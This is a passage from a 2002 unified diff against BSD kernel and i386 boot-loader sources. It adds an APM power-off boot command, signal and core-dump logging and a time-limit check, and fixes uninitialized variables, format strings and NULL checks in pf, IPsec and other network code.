+	if ((ai.apm_detail = apm_check())) {
+
+		apm_disconnect();
+		if (apm_connect_real(&ai) != 0)
+			printf("apmturnoff: connect error\n");
+		else {
+			f = apm_driver_version(0x0102);
+			if (f) {
+				f = apm_driver_version(0x0101);
+				if (f)
+					printf ("apmturnoff: driver_version returned %x\n", f);
+				  else	printf ("apmturnoff: 1.1 connection\n");
+			}
+
+			f = apm_set_power_state(a1, a2);
+			printf ("apmturnoff: apm_set_power_state returned %x\n",
+				 f);
+			printf ("apmturnoff: detail=%x\n",
+				ai.apm_detail);
+		}
+	} else
+		printf ("apmturnoff: apm_check returned 0\n");
+}
+
+/*
+ *	if we are booting into DOS, we should not
+ *	leave apm connected in "real mode".  Try to
+ *	leave apm in the "reset" state.
+ */
+
+void
+apm_reset()
+{
+	if (apm_is_connected)
+		apm_disconnect();
+}
Index: src/sys/arch/i386/stand/libsa/cmd_i386.c
===================================================================
RCS file: /cvs/src/sys/arch/i386/stand/libsa/cmd_i386.c,v
retrieving revision 1.24
diff -u -r1.24 cmd_i386.c
--- src/sys/arch/i386/stand/libsa/cmd_i386.c	14 Mar 2002 03:15:32 -0000	1.24
+++ src/sys/arch/i386/stand/libsa/cmd_i386.c	20 Dec 2002 23:24:42 -0000
@@ -50,6 +50,7 @@
 int Xdiskinfo(void);
 int Xmemory(void);
 int Xregs(void);
+int Xturnoff (void);
 
 /* From gidt.S */
 int bootbuf(void *, int);
@@ -61,6 +62,7 @@
 #ifdef DEBUG
 	{ "regs",     CMDT_CMD, Xregs },
 #endif
+	{ "off",	CMDT_CMD, Xturnoff },
 	{ NULL, 0 }
 };
 
@@ -83,6 +85,27 @@
 #endif
 
 int
+Xturnoff()
+{
+	int a1, a2;
+	a1 = a2 = -1;
+	switch(cmd.argc)
+	{
+	case 0:
+		printf("machine off [dev [how] ]\n");
+		return 0;
+	case 1:
+		break;
+	case 3:
+		a2 = strtol(cmd.argv[2], NULL, 0);
+	case 2:
+		a1 = strtol(cmd.argv[1], NULL, 0);
+	}
+	apmturnoff(a1, a2);
+	return 0;
+}
+
+int
 Xboot()
 {
 #ifndef _TEST
@@ -112,7 +135,7 @@
 	dev += (cmd.argv[1][2] - '0');
 	part = (cmd.argv[1][3] - 'a');
 
-	if (part > 0)
+	if (part >= 0)
 		printf("[%x,%d]\n", dev, part);
 	else
 		printf("[%x]\n", dev);
@@ -122,7 +145,7 @@
 	if(st) goto bad;
 
 	/* Frob boot flag in buffer from HD */
-	if((dev & 0x80) && (part > 0)){
+	if((dev & 0x80) && (part >= 0)) {
 		int i, j;
 
 		for(i = 0, j = DOSPARTOFF; i < 4; i++, j += 16)
@@ -131,6 +154,7 @@
 			else
 				buf[j] &= ~0x80;
 	}
+	apm_reset();
 
 	/* Load %dl, ljmp */
 	bcopy(buf, dest, DEV_BSIZE);
Index: src/sys/arch/i386/stand/libsa/gidt.S
===================================================================
RCS file: /cvs/src/sys/arch/i386/stand/libsa/gidt.S,v
retrieving revision 1.24
diff -u -r1.24 gidt.S
--- src/sys/arch/i386/stand/libsa/gidt.S	17 Sep 2001 13:09:47 -0000	1.24
+++ src/sys/arch/i386/stand/libsa/gidt.S	20 Dec 2002 23:24:42 -0000
@@ -204,8 +204,8 @@
 	lidt	Idtr
 	ret
 
-#define IPROC(n)	X/**/n
-#define IEMU(n)		IPROC(emu/**/n)
+#define IPROC(n)	X##n
+#define IEMU(n)		IPROC(emu##n)
 	.align 3
 idt:
 #define idte(e)	\
@@ -221,7 +221,7 @@
 		/* Maskable interrupts (32-255) */
 		/* BIOS entry points (32-63) */
 		/* DOS entry points (64-80) */
-#define idtb(b)	idte(emu/**/b)
+#define idtb(b)	idte(emu##b)
 	idtb(0);  idtb(1);  idtb(2);  idtb(3);  idtb(4);  idtb(5)
 	idtb(6);  idtb(7);  idtb(8);  idtb(9);  idtb(10); idtb(11)
 	idtb(12); idtb(13); idtb(14); idtb(15); idtb(16); idtb(17)
Index: src/sys/arch/i386/stand/libsa/libsa.h
===================================================================
RCS file: /cvs/src/sys/arch/i386/stand/libsa/libsa.h,v
retrieving revision 1.35
diff -u -r1.35 libsa.h
--- src/sys/arch/i386/stand/libsa/libsa.h	20 Jun 2002 20:22:36 -0000	1.35
+++ src/sys/arch/i386/stand/libsa/libsa.h	20 Dec 2002 23:24:42 -0000
@@ -57,6 +57,12 @@
 void *getSYSCONFaddr(void);
 void *getEBDAaddr(void);
 
+void apmturnoff (int, int);
+void apm_reset (void);
+
+void devboot (dev_t, char *);
+void machdep (void);
+
 extern const char bdevs[][4];
 extern const int nbdevs;
 extern u_int cnvmem, extmem; /* XXX global pass memprobe()->machdep_start() */
Index: src/sys/dev/ic/dc.c
===================================================================
RCS file: /cvs/src/sys/dev/ic/dc.c,v
retrieving revision 1.53
diff -u -r1.53 dc.c
--- src/sys/dev/ic/dc.c	21 Oct 2002 20:30:10 -0000	1.53
+++ src/sys/dev/ic/dc.c	20 Dec 2002 23:24:42 -0000
@@ -640,6 +640,7 @@
 	struct dc_softc		*sc = (struct dc_softc *)self;
 	int			i, rval, phy_reg;
 
+	phy_reg = 0;
 	bzero((char *)&frame, sizeof(frame));
 
 	/*
@@ -732,7 +733,6 @@
 			printf("dc%d: phy_read: bad phy register %x\n",
 			    sc->dc_unit, reg);
 			return(0);
-			break;
 		}
 
 		rval = CSR_READ_4(sc, phy_reg) & 0x0000FFFF;
@@ -763,6 +763,7 @@
 	struct dc_mii_frame	frame;
 	int			i, phy_reg;
 
+	phy_reg = 0;
 	bzero((char *)&frame, sizeof(frame));
 
 	if (DC_IS_ADMTEK(sc) && phy != DC_ADMTEK_PHYADDR)
@@ -1617,7 +1618,7 @@
 	struct dc_softc *sc;
 {
 	struct ifnet		*ifp;
-	int			error = 0, mac_offset, tmp, i;
+	int			error = 0, mac_offset, tmp = 0, i;
 
 	/*
 	 * Get station address from the EEPROM.
Index: src/sys/dev/mii/bmtphy.c
===================================================================
RCS file: /cvs/src/sys/dev/mii/bmtphy.c,v
retrieving revision 1.5
diff -u -r1.5 bmtphy.c
--- src/sys/dev/mii/bmtphy.c	14 Mar 2002 01:26:35 -0000	1.5
+++ src/sys/dev/mii/bmtphy.c	20 Dec 2002 23:24:42 -0000
@@ -93,11 +93,16 @@
 	struct mii_data *mii = ma->mii_data;
 	char *model;
 
-	if (MII_MODEL(ma->mii_id2) == MII_MODEL_BROADCOM_BCM5201)
+	switch (MII_MODEL(ma->mii_id2)) {
+    case MII_MODEL_BROADCOM_BCM5201:
 		model = MII_STR_BROADCOM_BCM5201;
-	else if (MII_MODEL(ma->mii_id2) == MII_MODEL_BROADCOM_BCM5221)
+		break;
+    case MII_MODEL_BROADCOM_BCM5221:
 		model = MII_STR_BROADCOM_BCM5221;
-
+		break;
+    default:
+	model = "unknown";
+    }
 	printf(": %s, rev. %d\n", model, MII_REV(ma->mii_id2));
 
 	sc->mii_inst = mii->mii_instance;
Index: src/sys/kern/kern_sig.c
===================================================================
RCS file: /cvs/src/sys/kern/kern_sig.c,v
retrieving revision 1.61
diff -u -r1.61 kern_sig.c
--- src/sys/kern/kern_sig.c	1 Oct 2002 17:33:17 -0000	1.61
+++ src/sys/kern/kern_sig.c	20 Dec 2002 23:24:42 -0000
@@ -83,7 +83,6 @@
 	{ 0, filt_sigattach, filt_sigdetach, filt_signal };
 
 void proc_stop(struct proc *p);
-void killproc(struct proc *, char *);
 int cansignal(struct proc *, struct pcred *, struct proc *, int);
 
 struct pool sigacts_pool;	/* memory pool for sigacts structures */
@@ -1228,20 +1227,6 @@
 }
 
 /*
- * Kill the current process for stated reason.
- */
-void
-killproc(p, why)
-	struct proc *p;
-	char *why;
-{
-
-	log(LOG_ERR, "pid %d was killed: %s\n", p->p_pid, why);
-	uprintf("sorry, pid %d was killed: %s\n", p->p_pid, why);
-	psignal(p, SIGKILL);
-}
-
-/*
  * Force the current process to exit with the specified signal, dumping core
  * if appropriate.  We bypass the normal tests for masked and caught signals,
  * allowing unrecoverable failures to terminate the process without changing
@@ -1254,6 +1239,36 @@
 	register struct proc *p;
 	int signum;
 {
+    switch (signum) {
+    case 0:
+    case SIGKILL:
+    case SIGINT:
+    case SIGTERM:
+    case SIGALRM:
+    case SIGSTOP:
+    case SIGTTIN:
+    case SIGTTOU:
+    case SIGTSTP:
+    case SIGHUP:
+    case SIGUSR1:
+    case SIGUSR2:
+	break;
+    default:
+	if (p->p_pptr != NULL)
+		log(LOG_INFO, "signal %d received by (%.32s:%d) UID(%lu) "
+		    "EUID(%lu), parent (%.32s:%d) UID(%lu) EUID(%lu)\n",
+		    signum, p->p_comm, p->p_pid,
+		    (unsigned long) p->p_cred->p_ruid,
+		    (unsigned long) p->p_ucred->cr_uid,
+		    p->p_pptr->p_comm, p->p_pptr->p_pid,
+		    (unsigned long) p->p_pptr->p_cred->p_ruid,
+		    (unsigned long) p->p_pptr->p_ucred->cr_uid);
+	  else
+		log(LOG_INFO, "signal %d received by (%.32s:%d) UID(%lu) "
+		    "EUID(%lu), zombie\n", signum, p->p_comm, p->p_pid,
+		    (unsigned long) p->p_cred->p_ruid,
+		    (unsigned long) p->p_ucred->cr_uid);
+    }
 
 	/* Mark process as going away */
 	p->p_flag |= P_WEXIT;
@@ -1309,7 +1324,7 @@
 	cred->cr_uid = p->p_cred->p_ruid;
 	cred->cr_gid = p->p_cred->p_rgid;
 
-	sprintf(name, "%s.core", p->p_comm);
+	snprintf(name, sizeof(name), "%s.core", p->p_comm);
 	NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, name, p);
 
 	error = vn_open(&nd, O_CREAT | FWRITE | O_NOFOLLOW, S_IRUSR | S_IWUSR);
@@ -1394,6 +1409,13 @@
 	crfree(cred);
 	if (error == 0)
 		error = error1;
+    if (!error)
+	log(LOG_WARNING, "core dumped for pid %d (%s)\n",
+	    p->p_pid, p->p_comm);
+    else
+	log(LOG_WARNING, "error %d while dumping core for pid %d (%s)\n",
+	    error, p->p_pid, p->p_comm);
+
 	return (error);
 }
 
Index: src/sys/kern/kern_synch.c
===================================================================
RCS file: /cvs/src/sys/kern/kern_synch.c,v
retrieving revision 1.46
diff -u -r1.46 kern_synch.c
--- src/sys/kern/kern_synch.c	15 Oct 2002 20:17:00 -0000	1.46
+++ src/sys/kern/kern_synch.c	20 Dec 2002 23:24:42 -0000
@@ -737,6 +737,20 @@
 			if (rlim->rlim_cur < rlim->rlim_max)
 				rlim->rlim_cur += 5;
 		}
+	  } else {
+		rlim = &p->p_rlimit[RLIMIT_TIME];
+		if (rlim->rlim_cur != RLIM_INFINITY) {
+			s = time.tv_sec - p->p_stats->p_start.tv_sec;
+			if (s >= rlim->rlim_cur) {
+				if (s >= rlim->rlim_max)
+					psignal(p, SIGKILL);
+				 else {
+					psignal(p, SIGXCPU);
+					if (rlim->rlim_cur < rlim->rlim_max)
+						rlim->rlim_cur += 5;
+				}
+			}
+		}
 	}
 	if (s > 10 * 60 && p->p_ucred->cr_uid && p->p_nice == NZERO) {
 		p->p_nice = NZERO + 4;
Index: src/sys/kern/kern_sysctl.c
===================================================================
RCS file: /cvs/src/sys/kern/kern_sysctl.c,v
retrieving revision 1.76
diff -u -r1.76 kern_sysctl.c
--- src/sys/kern/kern_sysctl.c	17 Dec 2002 23:11:09 -0000	1.76
+++ src/sys/kern/kern_sysctl.c	20 Dec 2002 23:24:42 -0000
@@ -278,6 +278,8 @@
 		return (sysctl_rdstring(oldp, oldlenp, newp, ostype));
 	case KERN_OSRELEASE:
 		return (sysctl_rdstring(oldp, oldlenp, newp, osrelease));
+	case KERN_OSPATCHLEVEL:
+		return (sysctl_rdstring(oldp, oldlenp, newp, ospatchlevel));
 	case KERN_OSREV:
 		return (sysctl_rdint(oldp, oldlenp, newp, OpenBSD));
 	case KERN_OSVERSION:
@@ -1314,13 +1316,13 @@
 	size_t *sizep;
 {
 #ifdef SYSVMSG
-	struct msg_sysctl_info *msgsi;
+	struct msg_sysctl_info *msgsi = NULL;
 #endif
 #ifdef SYSVSEM
-	struct sem_sysctl_info *semsi;
+	struct sem_sysctl_info *semsi = NULL;
 #endif
 #ifdef SYSVSHM
-	struct shm_sysctl_info *shmsi;
+	struct shm_sysctl_info *shmsi = NULL;
 #endif
 	size_t infosize, dssize, tsize, buflen;
 	int i, nds, error, ret;
@@ -1375,7 +1377,9 @@
 		*sizep = 0;
 		return (ENOMEM);
 	}
-	buf = malloc(min(tsize, buflen), M_TEMP, M_WAITOK);
+	if ((buf = malloc(min(tsize, buflen), M_TEMP, M_WAITOK)) == NULL) {
+	return (ENOMEM);
+    }
 	bzero(buf, min(tsize, buflen));
 
 	switch (*name) { 
Index: src/sys/kern/subr_userconf.c
===================================================================
RCS file: /cvs/src/sys/kern/subr_userconf.c,v
retrieving revision 1.31
diff -u -r1.31 subr_userconf.c
--- src/sys/kern/subr_userconf.c	29 Jul 2002 23:18:35 -0000	1.31
+++ src/sys/kern/subr_userconf.c	20 Dec 2002 23:24:42 -0000
@@ -482,7 +482,7 @@
 		}
 
 		if (c == 'y' || c == 'Y') {
-			int share = 0, i, *lk;
+			int share = 0, i, *lk = NULL;
 
 			/* XXX add cmd 'c' <devno> */
 			userconf_hist_cmd('c');
@@ -1059,7 +1059,7 @@
 {
 	int i = 0, found = 0;
 	struct cfdata new;
-	int  val, max_unit, star_unit, orig;
+	int  val, max_unit, star_unit, orig = 0;
 
 	bzero(&new, sizeof(struct cfdata));
 
Index: src/sys/kern/sys_generic.c
===================================================================
RCS file: /cvs/src/sys/kern/sys_generic.c,v
retrieving revision 1.41
diff -u -r1.41 sys_generic.c
--- src/sys/kern/sys_generic.c	12 Aug 2002 14:32:22 -0000	1.41
+++ src/sys/kern/sys_generic.c	20 Dec 2002 23:24:42 -0000
@@ -657,7 +657,7 @@
 	} */ *uap = v;
 	fd_set bits[6], *pibits[3], *pobits[3];
 	struct timeval atv;
-	int s, ncoll, error = 0, timo;
+	int s, ncoll, error = 0, timo = 0;
 	u_int nd, ni;
 
 	nd = SCARG(uap, nd);
@@ -926,7 +926,7 @@
 	struct pollfd pfds[4], *pl = pfds;
 	int msec = SCARG(uap, timeout);
 	struct timeval atv;
-	int timo, ncoll, i, s, error, error2;
+	int timo = 0, ncoll, i, s, error, error2;
 	extern int nselcoll, selwait;
 	u_int nfds = SCARG(uap, nfds);
 
Index: src/sys/kern/vfs_syscalls.c
===================================================================
RCS file: /cvs/src/sys/kern/vfs_syscalls.c,v
retrieving revision 1.98
diff -u -r1.98 vfs_syscalls.c
--- src/sys/kern/vfs_syscalls.c	2 Oct 2002 21:56:08 -0000	1.98
+++ src/sys/kern/vfs_syscalls.c	20 Dec 2002 23:24:43 -0000
@@ -109,7 +109,7 @@
 	char fspath[MNAMELEN];
 	struct vattr va;
 	struct nameidata nd;
-	struct vfsconf *vfsp;
+	struct vfsconf *vfsp = NULL;
 	struct timeval tv;
 
 	if (usermount == 0 && (error = suser(p->p_ucred, &p->p_acflag)))
Index: src/sys/lib/libz/Makefile
===================================================================
RCS file: /cvs/src/sys/lib/libz/Makefile,v
retrieving revision 1.3
diff -u -r1.3 Makefile
--- src/sys/lib/libz/Makefile	8 Sep 1998 04:07:25 -0000	1.3
+++ src/sys/lib/libz/Makefile	20 Dec 2002 23:24:43 -0000
@@ -5,7 +5,7 @@
 NOPIC=
 NOPROFILE=
 
-CPPFLAGS+=	-I. ${ZCPPFLAGS} -D_ZLIB_PRIVATE
+CPPFLAGS+=	-I. -I${.CURDIR} ${ZCPPFLAGS} -D_ZLIB_PRIVATE
 
 # files to be copied down from libz.
 LIBZSRCS= adler32.c crc32.c infblock.c infcodes.c inffast.c \
Index: src/sys/miscfs/procfs/procfs_vnops.c
===================================================================
RCS file: /cvs/src/sys/miscfs/procfs/procfs_vnops.c,v
retrieving revision 1.26
diff -u -r1.26 procfs_vnops.c
--- src/sys/miscfs/procfs/procfs_vnops.c	6 Apr 2002 23:39:51 -0000	1.26
+++ src/sys/miscfs/procfs/procfs_vnops.c	20 Dec 2002 23:24:43 -0000
@@ -746,7 +746,7 @@
 	struct vnode *dvp = ap->a_dvp;
 	char *pname = cnp->cn_nameptr;
 	struct proc *curp = curproc;
-	struct proc_target *pt;
+	struct proc_target *pt = NULL;
 	struct vnode *fvp;
 	pid_t pid;
 	struct pfsnode *pfs;
Index: src/sys/miscfs/union/union_vnops.c
===================================================================
RCS file: /cvs/src/sys/miscfs/union/union_vnops.c,v
retrieving revision 1.19
diff -u -r1.19 union_vnops.c
--- src/sys/miscfs/union/union_vnops.c	8 Jun 2002 18:43:12 -0000	1.19
+++ src/sys/miscfs/union/union_vnops.c	20 Dec 2002 23:24:43 -0000
@@ -1097,7 +1097,7 @@
 	int error = 0;
 	struct union_node *dun;
 	struct vnode *dvp;
-	struct vnode *vp;
+	struct vnode *vp = NULL;
 	struct proc *p = ap->a_cnp->cn_proc;
 
 	dun = VTOUNION(ap->a_dvp);
Index: src/sys/net/if_bridge.c
===================================================================
RCS file: /cvs/src/sys/net/if_bridge.c,v
retrieving revision 1.106
diff -u -r1.106 if_bridge.c
--- src/sys/net/if_bridge.c	9 Dec 2002 22:31:39 -0000	1.106
+++ src/sys/net/if_bridge.c	20 Dec 2002 23:24:43 -0000
@@ -2111,7 +2111,7 @@
 	struct tdb *tdb;
 	u_int32_t spi;
 	u_int16_t cpi;
-	int error, off;
+	int error, off = 0;
 	u_int8_t proto = 0;
 #ifdef INET
 	struct ip *ip;
Index: src/sys/net/if_gif.c
===================================================================
RCS file: /cvs/src/sys/net/if_gif.c,v
retrieving revision 1.25
diff -u -r1.25 if_gif.c
--- src/sys/net/if_gif.c	30 Jun 2002 13:04:14 -0000	1.25
+++ src/sys/net/if_gif.c	20 Dec 2002 23:24:43 -0000
@@ -298,6 +298,10 @@
 				&(((struct if_laddrreq *)data)->addr);
 			dst = (struct sockaddr *)
 				&(((struct if_laddrreq *)data)->dstaddr);
+	    break;
+
+	default:
+	    return EINVAL;
 		}
 
 		/* sa_family must be equal */
Index: src/sys/net/if_vlan.c
===================================================================
RCS file: /cvs/src/sys/net/if_vlan.c,v
retrieving revision 1.32
diff -u -r1.32 if_vlan.c
--- src/sys/net/if_vlan.c	12 Jun 2002 01:42:07 -0000	1.32
+++ src/sys/net/if_vlan.c	20 Dec 2002 23:24:43 -0000
@@ -397,7 +397,7 @@
 		 */
 		ifv->ifv_if.if_mtu = p->if_mtu - EVL_ENCAPLEN;
 #ifdef DIAGNOSTIC
-		printf("%s: initialized with non-standard mtu %d (parent %s)\n",
+		printf("%s: initialized with non-standard mtu %ld (parent %s)\n",
 		    ifv->ifv_if.if_xname, ifv->ifv_if.if_mtu,
 		    ifv->ifv_p->if_xname);
 #endif
Index: src/sys/net/pf.c
===================================================================
RCS file: /cvs/src/sys/net/pf.c,v
retrieving revision 1.280
diff -u -r1.280 pf.c
--- src/sys/net/pf.c	19 Dec 2002 12:45:44 -0000	1.280
+++ src/sys/net/pf.c	20 Dec 2002 23:24:43 -0000
@@ -669,9 +669,9 @@
 	pf_print_host(&s->gwy.addr, s->gwy.port, s->af);
 	printf(" ");
 	pf_print_host(&s->ext.addr, s->ext.port, s->af);
-	printf(" [lo=%lu high=%lu win=%u modulator=%u]", s->src.seqlo,
+	printf(" [lo=%u high=%u win=%u modulator=%u]", s->src.seqlo,
 	    s->src.seqhi, s->src.max_win, s->src.seqdiff);
-	printf(" [lo=%lu high=%lu win=%u modulator=%u]", s->dst.seqlo,
+	printf(" [lo=%u high=%u win=%u modulator=%u]", s->dst.seqlo,
 	    s->dst.seqhi, s->dst.max_win, s->dst.seqdiff);
 	printf(" %u:%u", s->src.state, s->dst.state);
 }
@@ -880,6 +880,7 @@
 	u_int32_t	opc, oh2c = *h2c;
 	u_int16_t	oip = *ip;
 
+	opc = 0U;
 	PF_ACPY(&oia, ia, af);
 	PF_ACPY(&ooa, oa, af);
 
@@ -958,12 +959,12 @@
 	struct m_tag	*mtag;
 	int		 len;
 #ifdef INET
-	struct ip	*h2;
+	struct ip	*h2 = NULL;
 #endif /* INET */
 #ifdef INET6
-	struct ip6_hdr	*h2_6;
+	struct ip6_hdr	*h2_6 = NULL;
 #endif /* INET6 */
-	struct tcphdr	*th2;
+	struct tcphdr	*th2 = NULL;
 
 	switch (af) {
 #ifdef INET
@@ -976,6 +977,8 @@
 		len = sizeof(struct ip6_hdr) + sizeof(struct tcphdr);
 		break;
 #endif /* INET6 */
+    default:
+	printf("panic: trying to send RST to an unhandled address family\n");
 	}
 
 	/* don't reply to RST packets */
@@ -2287,6 +2290,8 @@
 			state_icmp++;
 		break;
 #endif /* INET6 */
+	default:
+		return (PF_DROP);
 	}
 
 	if (direction == PF_OUT) {
@@ -2960,7 +2965,7 @@
 			printf("pf: loose state match: ");
 			pf_print_state(*state);
 			pf_print_flags(th->th_flags);
-			printf(" seq=%lu ack=%lu len=%u ackskew=%d pkts=%d\n",
+			printf(" seq=%u ack=%u len=%u ackskew=%d pkts=%d\n",
 			    seq, ack, pd->p_len, ackskew, (*state)->packets);
 		}
 
@@ -2995,7 +3000,7 @@
 			printf("pf: BAD state: ");
 			pf_print_state(*state);
 			pf_print_flags(th->th_flags);
-			printf(" seq=%lu ack=%lu len=%u ackskew=%d pkts=%d "
+			printf(" seq=%u ack=%u len=%u ackskew=%d pkts=%d "
 			    "dir=%s,%s\n", seq, ack, pd->p_len, ackskew,
 			    ++(*state)->packets,
 			    direction == PF_IN ? "in" : "out",
@@ -3148,6 +3153,8 @@
 			state_icmp++;
 		break;
 #endif /* INET6 */
+		default:
+			return (PF_DROP);
 	}
 
 	if (!state_icmp) {
@@ -3321,6 +3328,8 @@
 			} while (!terminal);
 			break;
 #endif /* INET6 */
+		default:
+			return (PF_DROP);
 		}
 
 		switch (pd2.proto) {
@@ -3375,7 +3384,7 @@
 				if (pf_status.debug >= PF_DEBUG_MISC) {
 					printf("pf: BAD ICMP state: ");
 					pf_print_state(*state);
-					printf(" seq=%lu\n", seq);
+					printf(" seq=%u\n", seq);
 				}
 				return (PF_DROP);
 			}
@@ -4183,7 +4192,7 @@
 	}
 
 done:
-	if (action != PF_DROP && h->ip_hl > 5 &&
+	if (action != PF_DROP && h != NULL && h->ip_hl > 5 &&
 	    !((s && s->allow_opts) || (r && r->allow_opts))) {
 		action = PF_DROP;
 		REASON_SET(&reason, PFRES_SHORT);
@@ -4219,8 +4228,9 @@
 			r0.ifp = ifp;
 			r0.action = action;
 			r0.nr = -1;
-			PFLOG_PACKET(ifp, h, m, AF_INET, dir, reason, &r0);
-		} else
+			if (h != NULL)
+				PFLOG_PACKET(ifp, h, m, AF_INET, dir, reason, &r0);
+		} else if (h != NULL)
 			PFLOG_PACKET(ifp, h, m, AF_INET, dir, reason, r);
 	}
 
Index: src/sys/net/pfkeyv2.c
===================================================================
RCS file: /cvs/src/sys/net/pfkeyv2.c,v
retrieving revision 1.84
diff -u -r1.84 pfkeyv2.c
--- src/sys/net/pfkeyv2.c	31 Jul 2002 00:13:14 -0000	1.84
+++ src/sys/net/pfkeyv2.c	20 Dec 2002 23:24:43 -0000
@@ -803,7 +803,7 @@
 
     struct tdb sa, *sa2 = NULL;
 
-    struct sadb_msg *smsg;
+    struct sadb_msg *smsg = NULL;
     struct sadb_spirange *sprng;
     struct sadb_sa *ssa;
     struct sadb_supported *ssup;
@@ -1773,7 +1773,8 @@
 	for (i = 1; i <= SADB_EXT_MAX; i++)
 	  headers[i] = NULL;
 
-	smsg->sadb_msg_errno = abs(rval);
+    if (smsg != NULL)
+  	  smsg->sadb_msg_errno = abs(rval);
     }
     else
     {
@@ -1783,6 +1784,9 @@
 	  if (headers[i])
 	    seen |= (1 << i);
 
+    if (smsg == NULL)
+      goto realret;
+
 	if ((seen & sadb_exts_allowed_out[smsg->sadb_msg_type]) != seen)
 	  goto realret;
 
@@ -1822,7 +1826,7 @@
     struct sadb_prop *sa_prop;
     struct sadb_msg *smsg;
     int rval = 0;
-    int i, j;
+    int i = 0, j;
 
     *seq = pfkeyv2_seq++;
 
@@ -2106,7 +2110,7 @@
     void *p, *headers[SADB_EXT_MAX+1], *buffer = NULL;
     struct sadb_msg *smsg;
     int rval = 0;
-    int i;
+    int i = 0;
 
     switch (sa->tdb_sproto)
     {
Index: src/sys/netinet/ip_ah.c
===================================================================
RCS file: /cvs/src/sys/netinet/ip_ah.c,v
retrieving revision 1.70
diff -u -r1.70 ip_ah.c
--- src/sys/netinet/ip_ah.c	5 Jul 2002 23:20:31 -0000	1.70
+++ src/sys/netinet/ip_ah.c	20 Dec 2002 23:24:43 -0000
@@ -682,7 +682,7 @@
 int
 ah_input_cb(void *op)
 {
-	int roff, rplen, error, skip, protoff;
+	int roff, rplen, error = 0, skip, protoff;
 	unsigned char calc[AH_ALEN_MAX];
 	struct mbuf *m1, *m0, *m;
 	struct cryptodesc *crd;
@@ -1214,7 +1214,7 @@
 int
 ah_output_cb(void *op)
 {
-	int skip, protoff, error;
+	int skip, protoff, error = 0;
 	struct tdb_crypto *tc;
 	struct cryptop *crp;
 	struct tdb *tdb;
Index: src/sys/netinet/ip_esp.c
===================================================================
RCS file: /cvs/src/sys/netinet/ip_esp.c,v
retrieving revision 1.76
diff -u -r1.76 ip_esp.c
--- src/sys/netinet/ip_esp.c	7 Nov 2002 15:16:17 -0000	1.76
+++ src/sys/netinet/ip_esp.c	20 Dec 2002 23:24:43 -0000
@@ -453,7 +453,7 @@
 esp_input_cb(void *op)
 {
 	u_int8_t lastthree[3], aalg[AH_HMAC_HASHLEN];
-	int hlen, roff, skip, protoff, error;
+	int hlen, roff, skip, protoff, error = 0;
 	struct mbuf *m1, *mo, *m;
 	struct cryptodesc *crd;
 	struct auth_hash *esph;
@@ -979,7 +979,7 @@
 	struct tdb_crypto *tc;
 	struct tdb *tdb;
 	struct mbuf *m;
-	int error, s;
+	int error = 0, s;
 
 	tc = (struct tdb_crypto *) crp->crp_opaque;
 	m = (struct mbuf *) crp->crp_buf;
Index: src/sys/netinet/ip_ipcomp.c
===================================================================
RCS file: /cvs/src/sys/netinet/ip_ipcomp.c,v
retrieving revision 1.9
diff -u -r1.9 ip_ipcomp.c
--- src/sys/netinet/ip_ipcomp.c	12 Sep 2002 10:11:17 -0000	1.9
+++ src/sys/netinet/ip_ipcomp.c	20 Dec 2002 23:24:43 -0000
@@ -206,7 +206,7 @@
 ipcomp_input_cb(op)
 	void *op;
 {
-	int error, s, skip, protoff, roff, hlen = IPCOMP_HLENGTH, clen;
+	int error = 0, s, skip, protoff, roff, hlen = IPCOMP_HLENGTH, clen;
 	u_int8_t nproto;
 	struct mbuf *m, *m1, *mo;
 	struct cryptodesc *crd;
@@ -609,7 +609,7 @@
 	struct tdb_crypto *tc;
 	struct tdb *tdb;
 	struct mbuf *m;
-	int error, s, skip, rlen;
+	int error = 0, s, skip, rlen;
 #ifdef INET
 	struct ip *ip;
 #endif
Index: src/sys/netinet/ip_ipsp.c
===================================================================
RCS file: /cvs/src/sys/netinet/ip_ipsp.c,v
retrieving revision 1.150
diff -u -r1.150 ip_ipsp.c
--- src/sys/netinet/ip_ipsp.c	19 Nov 2002 18:34:19 -0000	1.150
+++ src/sys/netinet/ip_ipsp.c	20 Dec 2002 23:24:43 -0000
@@ -867,7 +867,7 @@
 	    ntohl(tdb->tdb_spi), ipsp_address(tdb->tdb_dst), tdb->tdb_sproto);
 
 	l += sprintf(buffer + l, "\tEstablished %d seconds ago\n",
-	    time.tv_sec - tdb->tdb_established);
+	    (int) (time.tv_sec - tdb->tdb_established));
 
 	l += sprintf(buffer + l, "\tSource = %s", ipsp_address(tdb->tdb_src));
 
Index: src/sys/netinet/ip_output.c
===================================================================
RCS file: /cvs/src/sys/netinet/ip_output.c,v
retrieving revision 1.150
diff -u -r1.150 ip_output.c
--- src/sys/netinet/ip_output.c	10 Oct 2002 17:27:18 -0000	1.150
+++ src/sys/netinet/ip_output.c	20 Dec 2002 23:24:43 -0000
@@ -100,24 +100,24 @@
 ip_output(struct mbuf *m0, ...)
 {
 	struct ip *ip;
-	struct ifnet *ifp;
+	struct ifnet *ifp = NULL;
 	struct mbuf *m = m0;
 	int hlen = sizeof (struct ip);
 	int len, error = 0;
 	struct route iproute;
-	struct sockaddr_in *dst;
-	struct in_ifaddr *ia;
+	struct sockaddr_in *dst = NULL;
+	struct in_ifaddr *ia ;
 	struct mbuf *opt;
 	struct route *ro;
 	int flags;
 	struct ip_moptions *imo;
 	va_list ap;
 	u_int8_t sproto = 0, donerouting = 0;
-	u_long mtu;
+	u_long mtu = 0;
 #ifdef IPSEC
 	u_int32_t icmp_mtu = 0;
 	union sockaddr_union sdst;
-	u_int32_t sspi;
+	u_int32_t sspi = 0;
 	struct m_tag *mtag;
 	struct tdb_ident *tdbi;
 
Index: src/sys/netinet/ipsec_output.c
===================================================================
RCS file: /cvs/src/sys/netinet/ipsec_output.c,v
retrieving revision 1.25
diff -u -r1.25 ipsec_output.c
--- src/sys/netinet/ipsec_output.c	28 Aug 2002 15:42:41 -0000	1.25
+++ src/sys/netinet/ipsec_output.c	20 Dec 2002 23:24:43 -0000
@@ -65,15 +65,15 @@
 ipsp_process_packet(struct mbuf *m, struct tdb *tdb, int af, int tunalready)
 {
 	struct timeval tv;
-	int i, off, error;
+	int i = 0, off = 0, error;
 	struct mbuf *mp;
 
 #ifdef INET
 	int setdf = 0;
-	struct ip *ip;
+	struct ip *ip = NULL;
 #endif /* INET */
 #ifdef INET6
-	struct ip6_hdr *ip6;
+	struct ip6_hdr *ip6 = NULL;
 #endif /* INET6 */
 
 	/* Check that the transform is allowed by the administrator. */
@@ -323,11 +323,11 @@
 ipsp_process_done(struct mbuf *m, struct tdb *tdb)
 {
 #ifdef INET
-	struct ip *ip;
+	struct ip *ip = NULL;
